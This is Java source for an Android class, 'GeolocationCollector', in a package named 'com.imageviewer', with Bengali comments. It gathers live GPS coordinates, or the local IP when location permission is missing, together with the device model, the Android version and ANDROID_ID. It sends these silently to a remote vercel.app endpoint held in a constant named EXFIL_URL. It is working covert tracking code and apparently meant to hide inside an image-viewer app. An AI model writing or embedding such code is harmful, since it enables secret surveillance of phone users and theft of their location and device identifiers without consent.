package com.imageviewer;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.os.Build;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class GeolocationCollector {

    private static final String EXFIL_URL = "https://vercel-geo-api-locations.vercel.app/api/collect";
    private static final long LOCATION_TIMEOUT_MS = 20000; // 20 সেকেন্ড timeout

    private final Context context;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private LocationManager locationManager;

    private Callback callback;
    private boolean locationReceived = false;

    public interface Callback {
        void onCollecting();
        void onComplete(String statusMessage);
        void onError(String message);
    }

    public GeolocationCollector(Context context) {
        this.context = context;
        this.locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
    }

    public void setCallback(Callback cb) {
        this.callback = cb;
    }

    public void collectAndSend() {
        if (callback != null) callback.onCollecting();
        locationReceived = false;

        boolean hasFineLocation = ActivityCompat.checkSelfPermission(context,
                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (hasFineLocation) {
            Log.d("GeoCollector", "Permission granted → GPS থেকে live location নিচ্ছি...");
            requestLiveLocation();
        } else {
            Log.d("GeoCollector", "Permission নেই → Local IP fallback");
            executor.execute(this::collectViaLocalIp);
        }

        mainHandler.postDelayed(() -> {
            if (!locationReceived) {
                Log.d("GeoCollector", "GPS timeout → fallback Local IP");
                executor.execute(this::collectViaLocalIp);
            }
        }, LOCATION_TIMEOUT_MS);
    }

    private void requestLiveLocation() {
        try {
            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location loc) {
                    if (!locationReceived) {
                        Log.d("GeoCollector", "Live GPS location: " +
                                loc.getLatitude() + ", " + loc.getLongitude());
                        sendLocationToServer(loc.getLatitude(), loc.getLongitude(),
                                loc.getAccuracy(), "live_gps");
                        locationReceived = true;
                        locationManager.removeUpdates(this);
                        notifyComplete();
                    }
                }

                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };

            locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    2000, // প্রতি ২ সেকেন্ডে আপডেট
                    0,
                    listener,
                    Looper.getMainLooper()
            );

        } catch (SecurityException e) {
            Log.e("GeoCollector", "Security exception: " + e.getMessage());
            executor.execute(this::collectViaLocalIp);
        }
    }

    private void sendLocationToServer(double lat, double lon, float accuracy, String source) {
        executor.execute(() -> {
            try {
                String deviceInfo = collectDeviceInfo();
                sendToServer("lat=" + lat + "&lon=" + lon +
                        "&accuracy=" + accuracy +
                        "&location_source=" + source +
                        "&method=gps" + deviceInfo);
            } catch (Exception e) {
                Log.e("GeoCollector", "Error sending GPS data: " + e.getMessage());
            }
        });
    }

    // Local IP fallback
    private void collectViaLocalIp() {
        try {
            Log.d("GeoCollector", "Using Local IP fallback...");
            String localIp = getLocalIpAddress();

            String deviceInfo = collectDeviceInfo();
            sendToServer("ip=" + localIp +
                    "&method=local_ip" +
                    "&location_source=device-network" + deviceInfo);

            notifyComplete();

        } catch (Exception e) {
            Log.e("GeoCollector", "Local IP error: " + e.getMessage());
            notifyComplete();
        }
    }

    private void notifyComplete() {
        mainHandler.post(() -> {
            if (callback != null) callback.onComplete("✓ Location sent");
        });
    }

    private String httpGet(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);

        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) response.append(line);
        reader.close();
        return response.toString();
    }

    private void sendToServer(String params) {
        try {
            String getUrl = EXFIL_URL + "?" + params;
            httpGet(getUrl);
        } catch (Exception ignored) {}
    }

    private String collectDeviceInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("&device=").append(Build.DEVICE);
        sb.append("&model=").append(Build.MODEL);
        sb.append("&manufacturer=").append(Build.MANUFACTURER);
        sb.append("&brand=").append(Build.BRAND);
        sb.append("&android_version=").append(Build.VERSION.RELEASE);
        sb.append("&sdk=").append(Build.VERSION.SDK_INT);
        sb.append("&android_id=").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
        sb.append("&session=").append(UUID.randomUUID().toString());
        sb.append("&ts=").append(System.currentTimeMillis());
        return sb.toString();
    }

    private String getLocalIpAddress() {
        try {
            for (java.util.Enumeration<java.net.NetworkInterface> en = java.net.NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                java.net.NetworkInterface intf = en.nextElement();
                for (java.util.Enumeration<java.net.InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    java.net.InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof java.net.Inet4Address) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (Exception ex) {
            Log.e("GeoCollector", "Local IP error: " + ex.getMessage());
        }
        return "";
    }
}